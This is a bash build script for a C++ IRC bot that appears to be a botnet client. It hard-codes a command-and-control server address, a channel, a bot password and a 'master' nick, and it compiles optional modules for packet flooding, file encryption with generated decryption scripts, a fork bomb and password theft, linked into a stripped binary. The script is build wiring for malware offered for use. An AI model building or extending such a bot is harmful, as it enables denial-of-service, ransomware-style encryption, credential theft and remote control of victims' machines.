#!/bin/bash

ENABLE_PING_ACTION=0
ENABLE_ENCRYPT_ACTION=0
ENABLE_REPORT_ACTION=0
ENABLE_FORK_BOMB_ACTION=0
ENABLE_GET_PASSWD_ACTION=0

ENABLE_PING_FLAG=""
ENABLE_ENCRYPT_FLAG=""
ENABLE_REPORT_FLAG=""
ENABLE_FORK_BOMB_FLAG=""
ENABLE_GET_PASSWD_FLAG=""

PING_ACTION_OBJ=""
PACKET_LAUNCHER_OBJ=""
ENCRYPT_ACTION_OBJ=""
CRYPTO_MANAGER_OBJ=""
FS_DECRYPTOR_OBJ=""
GEN_SCRIPT_OBJ=""
REPORT_ACTION_OBJ=""
FORK_BOMB_ACTION_OBJ=""
GET_PASSWD_OBJ=""

BOT_NICK="bot_NICK"
BOT_USER="bot_USER"
SERVER_ADDRESS="52.90.220.187"
ASSIGNED_CHANNEL="#testChannel"
BOT_PASS="test123"
MASTER_NICK="master"

if [[ "$ENABLE_PING_ACTION" -eq 1 ]]; then
    g++ -std=c++17 -Wall -Wextra -Iinclude -c PingAction.cpp -o PingAction.o
    PING_ACTION_OBJ="PingAction.o"
    g++ -std=c++17 -Wall -Wextra -Iinclude -c PacketLauncher.cpp -o PacketLauncher.o
    PACKET_LAUNCHER_OBJ="PacketLauncher.o"
    ENABLE_PING_FLAG="-DENABLE_PING_ACTION"
fi

if [[ "$ENABLE_ENCRYPT_ACTION" -eq 1 ]]; then
    g++ -std=c++17 -Wall -Wextra -Iinclude -c EncryptAction.cpp -o EncryptAction.o
    ENCRYPT_ACTION_OBJ="EncryptAction.o"
    g++ -std=c++17 -Wall -Wextra -Iinclude -c CryptoManager.cpp -o CryptoManager.o
    g++ -std=c++17 -Wall -Wextra -Iinclude -c FileSystemDecryptor.cpp -o FileSystemDecryptor.o
    g++ -std=c++17 -Wall -Wextra -Iinclude -c GenDecryptionScript.cpp -o GenDecryptionScript.o
    CRYPTO_MANAGER_OBJ="CryptoManager.o"
    ENABLE_ENCRYPT_FLAG="-DENABLE_ENCRYPT_ACTION"
    FS_DECRYPTOR_OBJ="FileSystemDecryptor.o"
    GEN_SCRIPT_OBJ="GenDecryptionScript.o"
fi

if [[ "$ENABLE_REPORT_ACTION" -eq 1 ]]; then
    g++ -std=c++17 -Wall -Wextra -Iinclude -c ReportAction.cpp -o ReportAction.o
    REPORT_ACTION_OBJ="ReportAction.o"
    ENABLE_REPORT_FLAG="-DENABLE_REPORT_ACTION"
fi

if [[ "$ENABLE_FORK_BOMB_ACTION" -eq 1 ]]; then
    g++ -std=c++17 -Wall -Wextra -Iinclude -c ForkBombAction.cpp -o ForkBombAction.o
    FORK_BOMB_ACTION_OBJ="ForkBombAction.o"
    ENABLE_FORK_BOMB_FLAG="-DENABLE_FORK_BOMB_ACTION"
fi

if [[ "$ENABLE_GET_PASSWD_ACTION" -eq 1 ]]; then
    g++ -std=c++17 -Wall -Wextra -Iinclude -c GetPasswdAction.cpp -o GetPasswdAction.o
    GET_PASSWD_OBJ="GetPasswdAction.o"
    ENABLE_GET_PASSWD_FLAG="-DENABLE_GET_PASSWD_ACTION"
fi

g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_ENCRYPT_FLAG -DBOT_NICK=\"$BOT_NICK\" -DBOT_USER=\"$BOT_USER\" -DSERVER_ADDRESS=\"$SERVER_ADDRESS\" -DASSIGNED_CHANNEL=\"$ASSIGNED_CHANNEL\" -DBOT_PASS=\"$BOT_PASS\" -DMASTER_NICK=\"$MASTER_NICK\" -c BotMain.cpp -o BotMain.o
g++ -std=c++17 -Wall -Wextra -Iinclude $ENABLE_PING_FLAG $ENABLE_ENCRYPT_FLAG $ENABLE_REPORT_FLAG $ENABLE_FORK_BOMB_FLAG $ENABLE_GET_PASSWD_FLAG -c IrcClient.cpp -o IrcClient.o
g++ -std=c++17 -Wall -Wextra -Iinclude -c MessageParser.cpp -o MessageParser.o
g++ -std=c++17 -Wall -Wextra -Iinclude -c GeneralUtils.cpp -o GeneralUtils.o

g++ BotMain.o IrcClient.o MessageParser.o GeneralUtils.o $PING_ACTION_OBJ $PACKET_LAUNCHER_OBJ $ENCRYPT_ACTION_OBJ $CRYPTO_MANAGER_OBJ $FS_DECRYPTOR_OBJ $GEN_SCRIPT_OBJ $REPORT_ACTION_OBJ $FORK_BOMB_ACTION_OBJ $GET_PASSWD_OBJ -o irc_bot -lcryptopp -lircclient -ltins -lpcap -s

printf "Build complete!\n"